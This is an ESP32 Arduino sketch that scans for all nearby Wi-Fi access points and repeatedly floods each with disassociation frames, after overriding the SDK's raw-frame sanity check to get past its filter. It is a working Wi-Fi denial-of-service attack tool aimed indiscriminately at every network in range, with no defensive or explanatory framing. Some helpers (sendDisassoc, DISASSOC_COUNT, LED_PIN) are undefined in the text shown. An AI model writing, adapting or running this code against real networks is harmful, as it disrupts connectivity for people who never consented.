#include <WiFi.h>
#include <esp_wifi.h>
#include <deauth.h>

#define MAX_TARGETS 20
#define LOOP_DELAY 200

struct Target {
  uint8_t bssid[6];
  int channel;
  String ssid;
};

Target targets[MAX_TARGETS];
int targetCount = 0;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0; // bypass SDK filter
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(1000);

  Serial.println("Scanning for APs...");
  int n = WiFi.scanNetworks();
  Serial.printf("Found %d networks\n", n);

  for (int i = 0; i < n && targetCount < MAX_TARGETS; ++i) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;

    memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
    targets[targetCount].channel = WiFi.channel(i);
    targets[targetCount].ssid = ssid;
    Serial.printf("Loaded: %s | BSSID: %s | Channel: %d\n",
                  ssid.c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
    targetCount++;
  }

  Serial.printf("Ready to disassociate all clients from %d APs\n", targetCount);
}

void loop() {
  for (int i = 0; i < targetCount; ++i) {
    esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("Disassociating clients from: %s on channel %d\n",
                  targets[i].ssid.c_str(), targets[i].channel);

    for (int j = 0; j < DISASSOC_COUNT; ++j) {
      sendDisassoc(targets[i].bssid);
      delay(10);
    }
  }

  Serial.println("Loop complete. Waiting...");
  delay(LOOP_DELAY);
}